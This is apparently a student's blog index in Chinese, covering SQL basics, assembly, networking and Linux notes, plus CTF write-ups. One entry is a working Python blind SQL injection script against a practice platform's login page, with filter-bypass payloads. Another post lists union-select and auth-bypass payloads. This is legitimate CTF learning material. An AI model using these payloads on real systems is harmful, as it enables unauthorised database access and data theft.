<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>自己认为很好的博客收集贴（持续更新）</title>
      <link href="/2021/101354809.html"/>
      <url>/2021/101354809.html</url>
      
        <content type="html"><![CDATA[<p>2021.10-13<br>二次查询注入,查sqli-libs第五关看见的<br><a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql基本语句</title>
      <link href="/2021/101040039.html"/>
      <url>/2021/101040039.html</url>
      
        <content type="html"><![CDATA[<h2 id="基本查询语句"><a href="#基本查询语句" class="headerlink" title="基本查询语句"></a>基本查询语句</h2><p><strong>SELECT基本语句格式</strong>是：<br>SELECT{（字段列表）} FROM&lt;表1&gt;&lt;表2&gt;… WHERE &lt;表达式&gt;<br><br><br>查询到的结果结构如下图所示（*代表所有字段）：<br><br><a href="1"></a><br><br></p><p><strong>建表</strong>(案例)：<br>CREAT TABLE fruits<br><br>(<br><br>columns 数据类型  约束（not null 不接受null值）<br><br>f_id   char(10)  NOT NULL,<br><br>s_id   INT       NOT NULL,<br><br>f_name char(255) NOT NULL,<br><br>PRIMARY KEY(f_id)<br><br>)<br></p><br><p><strong>向表中插入数据</strong>：<br><br>INSERT INTO &lt;tableName&gt; (列1，列2，列3)<br><br>-&gt; VALUES( , , ),<br><br>( , , ),<br><br>…….<br><br>( , , );(括号内的数据类型要相符合)<br></p><p><strong>WHERE约束条件的使用</strong><br><br>案例1（<strong>IN</strong>）：<br><br>SELECT f_name,f_price FROM fruits WHERE f_price = 10.2<br><br>查询水果单价为10.2的name列和price列<br></p><p>案例2(<strong>NOT IN</strong>)：<br></p><p>SELECT f_name,f_price FROM fruits WHERE f_price IN （114，514）<br><br>查询臭水果单价再114到514之间的name列和price列,当然，如果是NOT IN,自然就是指单价不在这里面的了<br></p><p>案例3(<strong>BETWEEN AND</strong>)：<br><br>SELECT f_name,f_price FROM fruits WHERE f_price  BETWEEN 114 AND 514;<br><br>查找价格再在114到514之间的水果，包括价格为114与514的水果<br></p><p>案例4(<strong>LIKE</strong>)：<br><br>SELECT f_name,f_price FROM fruits WHERE f_name LIKE ‘b%’;<br><br>**通配符%**，这里是查找所有以’b’字符开头的水果名字，并匹配任意长度的字符，甚至包括\0字符<br><br>下面是查找以’b’开头，以’y’结尾的水果名字：<br>SELECT f_name,f_price FROM fruits WHERE f_name LIKE ‘b%y’;<br><br>包括g的名字：LIKE %g%<br><br>**通配符_**，匹配任意字符，并且一次只匹配一个<br><br>例如’_ _ _ _y’(这里特意间隔了方便看清) 匹配 ‘berry’<br></p><p>案例5(<strong>IS NULL</strong>)<br><br>当你希望某一列为空值时：SELECT f_name，f_price FROM fruits WHERE f_id IS NULL;<br></p><p>案例6(<strong>AND</strong>)<br><br>通过AND连接两个表达式，和c语言的&amp;和python的and差不多<BR><br>WHERE f_price = 114 AND f_id = ‘8848’</p><p>绑域名去了暂时先写到这里</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql2——payload(校园练习平台)</title>
      <link href="/2021/101045445.html"/>
      <url>/2021/101045445.html</url>
      
        <content type="html"><![CDATA[<p>主要采用了布尔注入，是《从0到1ctfer》的配套web题之一，原wp采用了报错注入，这里使用的是布尔注入方式<br><br>以下为自己写的payload：<br></p><pre><code>import requestsimport stringdic = string.digits + string.ascii_letters + &quot;!@\#\$%\^&amp;\*()_+&#123;&#125;-=&quot;def dabase_length():url=&quot;http://123.56.166.12:8803/login.php&quot;response = &quot;1&quot;for i in range(10):loginname = &quot;admin&#39; and &quot; + &quot;(length(database())=&quot; + str(i) + &quot;)\#&quot;data =&#123;&#39;name&#39;:loginname,&#39;pass&#39;:&#39;111&#39;&#125;responseold = responseresponse = requests.post(url=url , data = data).textif ((responseold != response)and responseold != &#39;1&#39;):print(&quot;database length is %s&quot;%i)break#爆数据库长度def database_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(65,123):key = &quot;admin&#39; and &quot; + &quot;(ascii(substr(database(),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).textif(right in response):name += chr(i)print(name)#爆数据库名字 notedef table_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(48,123):key = &quot;admin&#39; and &quot; + &quot;(ascii(substr((selselectect table_name FROMinformation_schema.tables WHERE table_schema = &#39;note&#39; limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).textif(right in response):name += chr(i)print(name)#爆表名 flgdef clumn_name():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(1,5):for i in range(48,123):key = &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect column_name FROMinformation_schema.columns WHERE table_name=&#39;fl4g&#39; limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).text\# print(response)if(right in response):name += chr(i)print(name)def flag():url=&quot;http://123.56.166.12:8803/login.php&quot;right = &#39;8bef&#39;name = &#39;&#39;for j in range(19,30):for i in range(48,126):key = &quot;admin&#39;&quot;+&quot; and (ascii(substr((seselectlect flag FROM fl4g limit0,1),%d,1))=%d)\#&quot;%(j,i)data =&#123;&#39;name&#39;:key,&#39;pass&#39;:&#39;114514&#39;&#125;response = requests.post(url=url,data=data).text\# print(response)if(right in response):name += chr(i)print(name)print(name)#爆段名if \__name_\_ == &quot;__main__&quot;:database_name()table_name()clumn_name()flag()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HPUCTF部分思路</title>
      <link href="/2021/101012765.html"/>
      <url>/2021/101012765.html</url>
      
        <content type="html"><![CDATA[<p><strong>HPUCTF部分思路</strong></p><p><strong>一.web</strong></p><p><strong>故障艺术</strong></p><p>进入靶机，查看网页源码，从注释中获取flag</p><p><strong>GET</strong></p><p>进入靶机环境，通过提示，用get方式对HPU赋值air-conditioning,传参后跳转页面获得flag</p><p><strong>本地查看</strong></p><p>使用burpsuit，拦截请求get请求，在请求头中添加参数X-Forwarded-For：127.0.0.1，表示来自本地访问</p><p><strong>POST</strong></p><p>使用hackbar，用post方式传参，password=123456（很容易猜中）</p><p><strong>到底是不是数字？</strong></p><p>分析php代码，意为num必须为数字但不能被判断为数字类型，在数字后加上字母来进行绕过。</p><p><strong>filter</strong></p><p>为p赋值为flag，被过滤不能直接访问，故使用php://filter协议实行绕过操作</p><p><strong>ctf大卖场</strong></p><p>登录界面使用万能密码进行绕过，然后点击购买，用burpsuite拦截请求，有cost和goods两个参数，当goods<br>== 1时，无论cost为多少，都会显示金钱不足，于是设置goods =<br>2或者3，再将cost改为负数，一直发送请求赚钱，赚两次购买flag</p><p><strong>easysql</strong></p><p>1,判断回显位置，先把id=1改为-1防止回显位置被占住，然后用union<br>select1,2,3…去寻找回显位置</p><ol><li>爆库名 select1,2,group_concat(schema_name) from<br> information_schema.schemata–+</li></ol><p><img src="./081832219/11.png"></p><p>3.查找note库中有哪些表：select 1,2,group_concat(table_name) from<br>information_schema.tables where table_schema=’note’ –+</p><p><img src="./081832219/12.png"></p><p>4.同样，段名： select concat(column_name) from information_schema.columns where<br>table_name=’fl4g’–+</p><p>5.然后 union select fllllag from fl4g–+</p><p><strong>二.逆向</strong></p><p><strong>babyre</strong></p><p>拖进ida，shift+f12查找字符串能直接看见flag</p><p><strong>三.MISC</strong></p><p><strong>签到题：进群</strong></p><p><strong>png隐写</strong></p><p>思路：进010调高度</p><p><strong>河南理工大学校徽</strong></p><p>binwalk扫描，改后缀为zip，然后解压。</p><p>二维码拖进ps或者sai2，找到违和感很强的那条错位线，使其右半部分框选住顺时针旋转180</p><p>扫描出的结果用base16解码，打开压缩包后，ppt文件用爆破工具进行爆破，再找到ppt最后一页，ctrl+a全选改文字颜色为醒目色。</p><p><strong>I wanna be the guy</strong></p><p>应该可以弄进od里然后跳关，但我是直接闯过去的</p><p><strong>音频隐写</strong></p><p>拖进Audacity里看频谱图</p><p><strong>最美奋斗者</strong></p><ol><li><p> 用binwalk扫描发现有zip文件，可以用工具分离，也可以用010editor把png的部分删掉，就可以进行爆破了（位数确实没想到）</p></li><li><p> 解一次伪加密</p></li><li><p> 继续根据提示爆破</p></li><li><p> 可以进行明文攻击</p></li><li><p> png更改高度，尽量改动大点，能看见右下角有二维码。扫码后得出flag</p></li></ol><p><strong>四.crypto</strong></p><p><strong>morse</strong></p><p>莫斯密码，可以用工具直接解出来</p><p><strong>莫斯密码？</strong></p><p>敲击码，对照可得出flag</p><p>KeyBoard</p><p>键盘密码，可以看出，每组是围成了一个圈的（在键盘上可看出来），密文就是圈内的内容。解出来就是flag</p><p>babyRSA</p><p>用工具，我使用的是RsaCtfTool脚本，enc后面的内容作为—uncipher内容输入</p><p>解出后获得flag</p><p><strong>没有羊排</strong></p><p>打开后全是otoot，可以怀疑是二进制，但是根据题目提示，更可能是培根密码，所以，将o和t转为a或b，两种情况下尝试后于解密网站上解密后得出flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编代码实现一个参数和局部变量相加的函数</title>
      <link href="/2021/092027713.html"/>
      <url>/2021/092027713.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><p>以下是源码，参数定义为三个整型，然后，局部变量三个分别为2，3，4，作用为计算六个数字的和。c语言肯定很好写，汇编就要考虑更多的栈的问题了。</p><pre><code>    int __declspec(naked) addwith(int x, int y, int z)&#123;    __asm     &#123;        push ebp //保存原栈底        mov ebp,esp        sub esp, 0x40  //提升堆栈        push ebx        push esi        push edi  //保存原始寄存器的值        mov eax, 0xcccccccc        mov ecx, 0x10          lea edi, dword ptr ss : [ebp - 0x40]        rep stosd   //装填缓存区        mov dword ptr ss : [ebp - 0x4] , 2        mov dword ptr ss : [ebp - 0x8] , 3        mov dword ptr ss : [ebp - 0xc] , 4  //写入局部变量        mov eax, dword ptr ss : [ebp - 0x4]        add eax, dword ptr ss : [ebp - 0x8]        add eax, dword ptr ss : [ebp - 0xc]        add eax, dword ptr ss : [ebp + 0x8]        add eax, dword ptr ss : [ebp + 0xc]         add eax, dword ptr ss : [ebp + 0x10] //函数计算        pop edi        pop esi        pop ebx //还原寄存器        mov esp, ebp        pop ebp //还原堆栈        ret    &#125;&#125;</code></pre><h2 id="2-注意的点"><a href="#2-注意的点" class="headerlink" title="2.注意的点"></a>2.注意的点</h2><ul><li>__declspec(naked)表示告诉编译器不需要添加其它的汇编代码，所以，如果你在这个函数中什么都不写，编译器甚至不会为你生成ret返回指令</li><li>时刻注意16进制前要加0x，否则很可能在填充缓冲区时造成错误覆盖返回地址</li><li>参数在调用函数前就已经被压入栈中了，所以在写函数的时候不要再push参数<h2 id="最后，中秋要到了"><a href="#最后，中秋要到了" class="headerlink" title="最后，中秋要到了=.="></a><font color="#66ccff">最后，中秋要到了=.=</font></h2><img src="./081832219/10.jpg" alt="大家中秋节快乐嘤嘤嘤"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言helloworld程序逆向时画的部分堆栈图（练习）</title>
      <link href="/2021/091325828.html"/>
      <url>/2021/091325828.html</url>
      
        <content type="html"><![CDATA[<p>堆栈图听着并不是很难，但实际画出来的感受便是很麻烦<br></p><p>以我现在的水平，还并不知道是不是堆栈图以后也要经常画，也挺困扰的。。</p><p><img src="./081832219/9.png" alt="很浅显，个人练习QAQ"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编jcc指令表（转载）</title>
      <link href="/2021/091241037.html"/>
      <url>/2021/091241037.html</url>
      
        <content type="html"><![CDATA[<div><table border="0" align="center"><tbody><tr><td>JCC指令</td><td>中文含义</td><td>英文原意</td><td>检查符号位</td><td>典型c应用</td></tr><tr><td>JZ/JE</td><td>若为0则跳转；若相等则跳转</td><td>jump if zero;jump if equal</td><td>ZF=1</td><td>if (i == j);if (i == 0);</td></tr><tr><td>JNZ/JNE</td><td>若不为0则跳转；若不相等则跳转</td><td>jump if not zero;jump if not equal</td><td>ZF=0</td><td>if (i != j);if (i != 0);</td></tr><tr><td>JS</td><td>若为负则跳转</td><td>jump if sign</td><td>SF=1</td><td>if (i &lt; 0);</td></tr><tr><td>JNS</td><td>若为正则跳转</td><td>jump if not sign</td><td>SF=0</td><td>if (i &gt; 0);</td></tr><tr><td>JP/JPE</td><td>若1出现次数为偶数则跳转</td><td>jump if Parity (Even)</td><td>PF=1</td><td>(null)</td></tr><tr><td>JNP/JPO</td><td>若1出现次数为奇数则跳转</td><td>jump if not parity (odd)</td><td>PF=0</td><td>(null)</td></tr><tr><td>JO</td><td>若溢出则跳转</td><td>jump if overflow</td><td>OF=1</td><td>(null)</td></tr><tr><td>JNO</td><td>若无溢出则跳转</td><td>jump if not overflow</td><td>OF=0</td><td>(null)</td></tr><tr><td>JC/JB/JNAE</td><td>若进位则跳转；若低于则跳转；若不高于等于则跳转</td><td>jump if carry;jump if below;jump if not above equal</td><td>CF=1</td><td>if (i &lt; j);</td></tr><tr><td>JNC/JNB/JAE</td><td>若无进位则跳转；若不低于则跳转；若高于等于则跳转</td><td>jump if not carry;jump if not below;jump if above equal</td><td>CF=0</td><td>if (i &gt;= j);</td></tr><tr><td>JBE/JNA</td><td>若低于等于则跳转；若不高于则跳转</td><td>jump if below equal;jump if not above</td><td>ZF=1或CF=1</td><td>if (i &lt;= j);</td></tr><tr><td>JNBE/JA</td><td>若不低于等于则跳转；若高于则跳转</td><td>jump if not below equal;jump if above</td><td>ZF=0或CF=0</td><td>if (i &gt; j);</td></tr><tr><td>JL/JNGE</td><td>若小于则跳转；若不大于等于则跳转</td><td>jump if less;jump if not greater equal</td><td>SF != OF</td><td>if (si &lt; sj);</td></tr><tr><td>JNL/JGE</td><td>若不小于则跳转；若大于等于则跳转</td><td>jump if not less;jump if greater equal</td><td>SF=OF</td><td>if (si &gt;= sj);</td></tr><tr><td>JLE/JNG</td><td>若小于等于则跳转；若不大于则跳转</td><td>jump if less equal;jump if not greater</td><td>ZF != OF 或 ZF=1</td><td>if (si &lt;= sj);</td></tr><tr><td>JNLE/JG</td><td>若不小于等于则跳转；若大于则跳转</td><td>jump if not less equal;jump if greater</td><td>SF=OF 且 ZF=0</td><td>if(si&gt;sj)</td></tr></tbody></table></div><p>转自<a href="https://www.cnblogs.com/Drunkmars/p/14533653.html">Drunkmars,点击前往</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提问的艺术.md（转载）</title>
      <link href="/2021/08201.html"/>
      <url>/2021/08201.html</url>
      
        <content type="html"><![CDATA[<h1 id="How-To-Ask-Questions"><a href="#How-To-Ask-Questions" class="headerlink" title="How-To-Ask-Questions"></a>How-To-Ask-Questions</h1><blockquote><p><strong>群里提问的艺术</strong></p></blockquote><p>现在互联网发达的时代，大家都会有很多的群，xxx 交流群、xxx 技术交流、xxx开发群、xxx技术学习群等，大家的初心可能都是想交流的，遇到点问题然后就可以在群里问。</p><p>然而很多时候你问的问题没人回答；也有时候问了半天还是没找到答案；也有时候当你把问题发出来了，别人正准备回答你的时候，你说知道了；然后刚开始群里很活跃，慢慢的就死了。</p><p>其实以上问题，都是大家不想看到的，然而<strong>在群里提问</strong>是我们加入群的初心，但是很多人做不好，最终导致你的问题无人解答，群慢慢的失去意义。</p><p>我将今天的问题分成以下三部分进行介绍：</p><ul><li>提问之前</li><li>提问之时，怎么提问注意事项</li><li>注意事项</li></ul><h3 id="提问之前"><a href="#提问之前" class="headerlink" title="提问之前"></a>提问之前</h3><p>在群里提问之前首先我们应该做好功课，看自己是否完成以下步骤，否则你的提问将一塌糊涂，大概率得不到想要 的答案。</p><ol><li>尝试自己解决</li><li>不能自己解决应该准备的哪些</li></ol><p><strong>尝试自己解决</strong></p><p>尝试自己解决是非常重要的一步，这也是我们能否经过这个问题能够成长的关键所在。</p><ol><li><strong>通过搜索引擎搜索：</strong> baidu 或者 google(推荐)，搜索结果中前三页如果找不到你想要的信息，就进行下一步吧。对于成熟的开源项目，你遇到的问题，很可能别人也遇到过。这时通过 Google、StackOverflow 等网站的搜索服务，可以帮你快速定位并解决问题。永远记住，地球上的你并不孤单，包括你遇到的问题。</li><li><strong>查阅手册/文档：</strong> 确保自己阅读过至少一次官方文档。这样在遇到问题时，如果能回忆起只言片语，就可以再去读一遍相关文档，问题往往也就解决了。</li><li><strong>查阅社区/论坛：</strong> 阅读常见问题文件（FAQ）或者开源项目的 issue，或者论坛(类似 react china)</li><li><strong>询问朋友：</strong> 如果你使用的开源软件，在朋友圈或同事圈里也有人使用，那么抬起你的脚、或拿起你的电话，真挚诚恳的探讨不会遭遇拒绝，而会增进友谊。不要犹豫，你的内心渴望面对面交流，你的朋友也是。</li><li><strong>自检并不断测试：</strong> 试自己检查或试验以找到答案。</li><li><strong>阅读源码(这步非必须)：</strong> 如果你是程序开发者，尽量尝试阅读源码以找到答案。</li></ol><p>经过以上 6 步或者 5 步你都无法解决遇到的问题，那么你确实针对这个问题能力有限，准备去群里请教了，那么在尝试自己解决之后无果，应该做哪些准备呢？</p><p><strong>不能自己解决应该准备的哪些</strong></p><ol><li>一定要明白自己想要问什么问题：不能自己都说不清自己想要问什么问题，那么群里提问你也问不出什么来。</li><li>梳理准备您的问题：要说明之前你都干了些什么。</li><li>要用言简意赅的语言：这个是我们作为职场一个必备的技能，说重点，言简意赅。</li></ol><h4 id="怎么提问"><a href="#怎么提问" class="headerlink" title="怎么提问"></a>怎么提问</h4><p>抱着平和对等的心态，找到合适的途径后，就得静下心来将遇到的问题写成文字。书写文字不是一件简单的事情，我们可以从遵循一些简单的规则开始。</p><p><strong>用词准确，问题明确</strong></p><p>标题要简洁清晰，要言之有物。</p><blockquote><p>Bad：救命呀/急/跪求，遇到了一个 react 问题，xxx 组件渲染不出来<br>Good：在使用 xxx 版本的 react ，我操作了 xxx，也写了 xxx，但是 xxx 组件渲染不出来</p></blockquote><p>一个好标题范例是 <code>目标 —— 差异式</code>的描述，许多技术支持组织就是这样做的。在目标部分指出是哪一个或哪一组东西有问题，在<code>差异</code>部分则描述与期望的行为不一致的地方。</p><h4 id="描述清晰，信息充足"><a href="#描述清晰，信息充足" class="headerlink" title="描述清晰，信息充足"></a>描述清晰，信息充足</h4><ol><li><strong>准确有效的信息：</strong> 描述事实，而不是猜测，如果你想给出你的猜测，一定要先描述事实，给你的猜测一些证据，不然就不要猜测。</li><li><strong>问题表现/内容：</strong> 按照时间顺序列出问题症状。问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。</li><li><strong>简单的做过什么尝试：</strong> 在描述你做过什么尝试的时候，简单的你描述你做了哪些尝试就行，为什么要这么做其实不是那么重要。</li></ol><p>如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。</p><p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p><p>玉伯有句话是这么说的：</p><blockquote><p>提问者选择的路本身就是一条崎岖之路，对于要解决的问题，实际上有更好的方式。这种情况下，描述清楚目标，讲清楚要干什么非常重要。</p></blockquote><ul><li> 想要问到什么：提供建议？发送一段代码？检查你的补丁或者别的？在群里经常会出现这种情况，当某个人发了一段文字，另外的人说：你想问什么？</li></ul><p>所以我们在问问题的时候一定要把你想要问到什么，这个目标想清楚。</p><ul><li>提供尽量多的信息：尽量提供可重现的例子，你可以在 jsbin)、runjs、jsfiddle)、codepen 等这些地方提供一个可重现的例子。即使你是一个很大的项目，想办法把你需要验证的点提取出来，如果确实无法提取，就贴一些代码，出现问题那行代码周围的代码(周围的相关代码都要，因为你可能觉得不是他们的问题，但也许就是，不然你觉得的都是对的，你就不会不知道怎么解决了)。</li></ul><h4 id="避免一些毫无意义的问题"><a href="#避免一些毫无意义的问题" class="headerlink" title="避免一些毫无意义的问题"></a>避免一些毫无意义的问题</h4><p>经常会有人问一些毫无意义的问题，比如这样的：</p><blockquote><p>Bad：有没有人会xxx？<br>Bad：有没有人在？<br>Bad：谁能帮我解决一个问题？</p></blockquote><p>面对这种问题，别人就很难预估你这个问题需要解决多久，也很难判断自己是否能解决这个问题，如果他回答了你，意味着你就是有空而且很在行，所以他还是选择不出声。这个就跟微信私聊的时候说：”在吗？“ 这种一个意思。</p><blockquote><p>Bad: 什么是 JavaScript？</p></blockquote><p>这种问题也是，很明显通过搜索引擎就能搞定的，要是下次还有这种问题，你就把这个图发给它。</p><p><img src="./081832219/7.jpg" alt="头文字D了属于是"></p><h4 id="建议的问法："><a href="#建议的问法：" class="headerlink" title="建议的问法："></a>建议的问法：</h4><ol><li>有问题直接问。比如：ES6什么时候雄霸天下，前端什么时候一统江湖？</li><li>直接说场景：我在做xx端东西的时候，在 window 7 平台的 IE7 版本下遇到了左右不对齐问题，具体如图所示img，代码地址：xxx 在百度中找到的答案，试了之后还是有同样的问题。请有空的同学帮我看看是什么问题？</li></ol><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>提前做好冷场的准备：也许别人在忙，也许这个问题太简单了，也许没人做过这块，如果冷场了，没人回答，赶紧换下一个群。<br>谦虚，别人没有义务帮你解决问题，往往大牛的时间比你少，比你珍贵。<br>没有一定的自学能力，问到问题就伸手的不适合玩这个。<br>群唯一的作用就是：扯淡、交流、分享，以上几条为前提。<br>如果觉得问题记不住，收藏一下这个图吧：<br><img src="./081832219/8.jpg"></p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>其实对于问问题，我们换位思考一下就更好了，这其实也是人际交往的方式，站在看你提问题的角度，想想当别人提问题的时候，你想让他问什么，你才愿意去回答。</p><p>当然除了在群里提问，在社区里提问，论坛里提问都有一定的规范，后面再慢慢补充吧。</p><p>本文由 <a href="http://taoweng.site/index.php/author/1/">taoweng</a> 创作，转自 <a href="https://github.com/MasterLover/How-To-Ask-Questions">链接</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> etc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于《网络是怎样连接的》一点笔记</title>
      <link href="/2021/081832219.html"/>
      <url>/2021/081832219.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-浏览器解析url"><a href="#1-浏览器解析url" class="headerlink" title="1.浏览器解析url"></a><font color="red">1.浏览器解析url</font></h2><p>URL 的格式会随着协议的不同而不同，如图，url会被拆分为几个部分。<br><br><img src="./081832219/1.png"><br>我们可以明白，这个链接要访问的是 <a href="http://www.lab.glasscom.com下/">www.lab.glasscom.com下</a> <font color="green">根目录（/）-&gt;dir1-&gt;file1.html</font>的页面。另外，还有一种省略文件名的写法:<br></p><blockquote><p><a href="http://www.lab.glasscom.com/dir/">http://www.lab.glasscom.com/dir/</a></p></blockquote><p>这种通常省略了什么文件呢？其实，省略的文件一般是决定好的，大多数情况下是 index.html 或者 default.htm 之类的<br>文件名。同样，下面的这种写法也是访问默认文件名：</p><blockquote><p><a href="http://www.lab.glasscom.com/">http://www.lab.glasscom.com</a></p></blockquote><h2 id="2-http的主要方法"><a href="#2-http的主要方法" class="headerlink" title="2.http的主要方法"></a><font color="red">2.http的主要方法</font></h2><p>如图<br><img src="./081832219/2.png"></p><h2 id="3-http请求消息的相关格式"><a href="#3-http请求消息的相关格式" class="headerlink" title="3.http请求消息的相关格式"></a><font color="red">3.http请求消息的相关格式</font></h2><p>请求消息的格式随处可见，我们打开哔哩哔哩的网页，按下f12，在我们刷新网页的时候，抓包工具总是会抓住各种各样的请求，在请求消息中，我们会见到如下格式的消息：<br><br><img src="./081832219/3.png" alt="这些格式我们见多了就大概了解了"><br><br>由于每条请求消息中只能写 1 个 URI，所以每次只能获取 1 个文件，如果需要获取多个文件，必须对每个文<br>件单独发送 1 条请求。比如 1 个网页中包含 3 张图片，那么获取网页加上获取图片，一共需要向 Web 服务<br>器发送 4 条请求。</p><h2 id="4-回应状态码的解释"><a href="#4-回应状态码的解释" class="headerlink" title="4.回应状态码的解释"></a><font color="red">4.回应状态码的解释</font></h2><p>当我们发送请求后，服务器会返回一个状态码，大概也就是访问后的情况怎么样，最常见到的多半是200，404，504之类的。下图为解释：<br><img src="./081832219/4.png"><br></p><h2 id="5-关于IP的一些小知识"><a href="#5-关于IP的一些小知识" class="headerlink" title="5.关于IP的一些小知识"></a><font color="red">5.关于IP的一些小知识</font></h2><p>浏览器本身不具备将http消息发送出去的能力，所以还是要操作系统来帮助发送。发送时必不可少的便是服务器的ip地址，在找到ip之前，还必须用dns解析域名才能得到ip，现在我们先来讲讲ip地址：<br><br>互联网和公司内部的局域网都是基于 TCP/IP 的思路来设计的，TCP/IP的结构是由许多小的子网,通过路由器链接起来的一个大网络。在网络中，所有的设备都会被分配一个地址。这个地址就相当于现实中某条路上的“×× 号 ×× 室”。路由器会根据消息的目的地判断下一个路由器的位置，然后将消息发送到下一个路由器，即消息再次经过子网内的集线器被转发到下一个路由器。前面的过程不断重复，最终消息就被传送到了目的地。<br><img src="./081832219/5.png"><br><br>实际的 IP 地址是一串 32 比特的数字，按照 8 比特（1 字节）为一组分成 4 组，分别用十进制<br>表示然后再用圆点隔开。这就是我们平常经常见到的 IP 地址格式，但仅凭这一串数字我们无法区分哪部分<br>是网络号，哪部分是主机号。在 IP 地址的规则中，网络号和主机号连起来总共是 32 比特，但这两部分的具<br>体结构是不固定的。在组建网络时，用户可以自行决定它们之间的分配关系，因此，我们还需要另外的附加<br>信息来表示 IP 地址的内部结构。<br><br>这一附加信息就是子网掩码。子网掩码的作用如下图所示,通过1来表示网络号，0来表示主机号。总共32位的ip，24位的子网掩码则表面最后八位是表示主机地址的了。<br><br><img src="./081832219/6.png"><br><br>还有一件事，主机号部分全部为 0 代表整个子网而不是子网中的某台设备（图 1.9（d））。此外，主机号部分全部为 1 代表向子网上所有设备发送包，即广播。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于linux的一些小知识</title>
      <link href="/2021/081711.html"/>
      <url>/2021/081711.html</url>
      
        <content type="html"><![CDATA[<p>-</p><h1 id="linx的一些基础小知识-gt-lt"><a href="#linx的一些基础小知识-gt-lt" class="headerlink" title="linx的一些基础小知识&gt;_&lt; "></a><font color="rgb(25,211,132)">linx的一些基础小知识&gt;_&lt; </font></h1><h3 id="linux上磁盘连接的方式与装置文件名的关系"><a href="#linux上磁盘连接的方式与装置文件名的关系" class="headerlink" title="linux上磁盘连接的方式与装置文件名的关系 "></a><font color="red">linux上磁盘连接的方式与装置文件名的关系 </font></h3><p>个人计算机常见的磁盘接口有两种，分别是 SATA与 SAS 接口，<br>目前的主流是 SATA 接口如果你PC上面有两个 SATA 磁盘以及一个 USB 磁盘，而主板上面有六个 SATA 的插槽。这两个 SATA 磁盘分别安插在主板上的 SATA1, SATA5 插槽上。由于是使用侦测到的顺序来决定装置文件名，并非与实际插槽代号有关，因此装置的文件名如下:<br></p><ol><li>SATA1 插槽上的檔名：/dev/sda <br></li><li>SATA5 插槽上的檔名：/dev/sdb <br></li><li>USB 磁盘(开机完成后才被系统捉到)：/dev/sdc<br><br></li></ol><h3 id="linux的目录树结构"><a href="#linux的目录树结构" class="headerlink" title=" linux的目录树结构 "></a><font color="red"> linux的目录树结构 </font></h3><p>linux上的根目录用一根【/】来表示， 所有的文件都与目录树有关。目录树的呈现方式如下图所示：<br></p><p><img src="https://i.ibb.co/dcr8jw8/1-1.png" alt="目录树"><br><br><br>如上图所示，所有的文件都是由根目录(/)衍生来的，而次目录之下还能够有其他的数据存在。上图中<br>长方形为目录，波浪形则为文件。那当我们想要取得 mydata 那个文件时，系统就得由根目录开始找，<br>然后找到 home 接下来找到 dmtsai， 最终的档名为：/home/dmtsai/mydata 的意思。<br></p><h3 id="中文输入法与设定"><a href="#中文输入法与设定" class="headerlink" title=" 中文输入法与设定 "></a><font color="red"> 中文输入法与设定 </font></h3><p>如果你的linux安装的时非中文语言，要使用中文输入法,在桌面左上角选择<strong>账户</strong>，再选择<strong>设定值</strong>，之后选择<strong>地区和语言</strong>项目，将中文选上即可。</p><h3 id="关于登入的用户与其所管理的文件范围"><a href="#关于登入的用户与其所管理的文件范围" class="headerlink" title=" 关于登入的用户与其所管理的文件范围 "></a><font color="red"> 关于登入的用户与其所管理的文件范围 </font></h3><p>举例来说，root 的家目录在/root， 所以 ~ 就代表/root 的意思。而 dmtsai 的家目录在<br>/home/dmtsai， 所以如果你以 dmtsai 登入时，他看到的 ~ 